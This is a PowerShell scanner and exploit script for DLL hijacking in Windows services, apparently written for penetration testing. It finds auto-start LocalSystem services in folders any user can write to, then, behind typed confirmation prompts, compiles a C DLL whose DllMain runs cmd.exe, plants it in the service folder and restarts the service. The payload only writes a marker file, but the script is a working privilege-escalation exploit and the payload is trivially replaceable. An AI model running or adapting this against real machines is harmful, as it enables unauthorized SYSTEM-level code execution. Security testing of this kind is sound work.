﻿<#
.SYNOPSIS
    19-Check-DLL-Hijacking&POC.ps1

.AUTEUR
    VAAST Loïc
    lvaast@sofinco.fr
    © 2025 VAAST Loïc - Tous droits réservés.

.LICENCE
    MIT Licence modifiée - Attribution obligatoire

    Copyright © 2025 VAAST Loïc

    Ce code est distribué gratuitement avec droit d'usage, de modification et de redistribution, à condition de mentionner l'auteur original dans toute copie ou version dérivée.

.VERSION
    1.2

.OPSEC
    POC – Exploitation performed
#>

param(
    [switch]$Exploit
)

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "        Check DLL Hijacking (EXPLOIT)       " -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

# ===================== SAFETY GATE =====================

if ($Exploit) {
    Write-Host "`n[!] OFFENSIVE MODE REQUESTED" -ForegroundColor Red
    Write-Host " This will attempt CONTROLLED DLL HIJACK exploitation" -ForegroundColor Red
    Write-Host " Only use on AUTHORIZED SYSTEMS" -ForegroundColor Red

    $confirm = Read-Host "`nType 'I AM AUTHORIZED' to continue"
    if ($confirm -ne "I AM AUTHORIZED") {
        Write-Host "[ABORTED] Authorization not confirmed" -ForegroundColor Yellow
        exit
    }
}

# ===================== CONFIG =====================

$RiskGroups = @(
    "Everyone","BUILTIN\Users","Users","Authenticated Users",
    "Domain Users","BUILTIN\Utilisateurs",
    "AUTORITE NT\Utilisateurs authentifiés"
)

$CommonDLLs = @(
    "version.dll","winmm.dll","dbghelp.dll","cryptbase.dll"
)

$Results = @()

# ===================== FUNCTIONS =====================

function Get-ExePath {
    param($PathName)
    if ($PathName.StartsWith('"')) { return $PathName.Split('"')[1] }
    return $PathName.Split(" ")[0]
}

function Is-Writable {
    param($Folder)
    try { $acl = Get-Acl $Folder } catch { return $false }
    foreach ($ace in $acl.Access) {
        if ($ace.AccessControlType -eq "Allow" -and
            $ace.FileSystemRights -match "Write|Modify|FullControl" ) {
            foreach ($g in $RiskGroups) {
                if ($ace.IdentityReference -match $g) { return $true }
            }
        }
    }
    return $false
}

function Compile-POCDLL {
    param($OutPath)

$code = @"
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) {
        WinExec("cmd.exe /c echo DLL_HIJACKED > C:\\dll_hijack_poc.txt", SW_HIDE);
    }
    return TRUE;
}
"@

    $src = "$env:TEMP\poc.c"
    Set-Content $src $code

    Write-Host "[*] Compiling POC DLL..." -ForegroundColor Cyan
    & cl.exe /LD $src /Fe:$OutPath /link /NOLOGO 2>$null
}

# ===================== SCAN =====================

Write-Host "`n=== DLL HIJACK SCAN v2 ===" -ForegroundColor Cyan

$services = Get-WmiObject Win32_Service |
    Where-Object {$_.PathName}

foreach ($svc in $services) {

    $exe = Get-ExePath $svc.PathName
    if (-not (Test-Path $exe)) { continue }

    $folder = Split-Path $exe -Parent
    if (-not (Test-Path $folder)) { continue }

    $risk = 0
    if ($svc.StartName -match "LocalSystem") { $risk += 5 }
    if ($svc.StartMode -eq "Auto") { $risk += 5 }
    if (Is-Writable $folder) { $risk += 5 }

    if ($risk -lt 10) { continue }

    $missing = @()
    foreach ($dll in $CommonDLLs) {
        if (-not (Test-Path (Join-Path $folder $dll))) {
            $missing += $dll
        }
    }

    if ($missing.Count -eq 0) { continue }

    Write-Host "`n[VULNERABLE] $($svc.Name)" -ForegroundColor Red
    Write-Host " RiskScore : $risk"
    Write-Host " Folder    : $folder"
    Write-Host " Missing   : $($missing -join ', ')"

    $Results += [PSCustomObject]@{
        Service = $svc.Name
        Folder  = $folder
        DLL     = $missing[0]
        Score   = $risk
    }
}

if ($Results.Count -eq 0) {
    Write-Host "`n[+] No exploitable services found" -ForegroundColor Green
    exit
}

# ===================== EXPLOIT =====================

if ($Exploit) {

    $target = $Results | Sort-Object Score -Descending | Select-Object -First 1

    Write-Host "`n[!] TARGET SELECTED" -ForegroundColor Red
    Write-Host " Service : $($target.Service)"
    Write-Host " DLL     : $($target.DLL)"
    Write-Host " Folder  : $($target.Folder)"

    $dllPath = Join-Path $target.Folder $target.DLL

    $go = Read-Host "`nDeploy DLL and hijack service? (YES/NO)"
    if ($go -ne "YES") {
        Write-Host "[ABORTED]" -ForegroundColor Yellow
        exit
    }

    Compile-POCDLL -OutPath $dllPath

    Write-Host "[+] DLL dropped : $dllPath" -ForegroundColor Cyan

    $restart = Read-Host "Restart service now? (YES/NO)"
    if ($restart -eq "YES") {
        Restart-Service $target.Service -Force
        Write-Host "[+] Service restarted" -ForegroundColor Cyan
    }

    Write-Host "`n[POC] Check C:\dll_hijack_poc.txt" -ForegroundColor Green
}
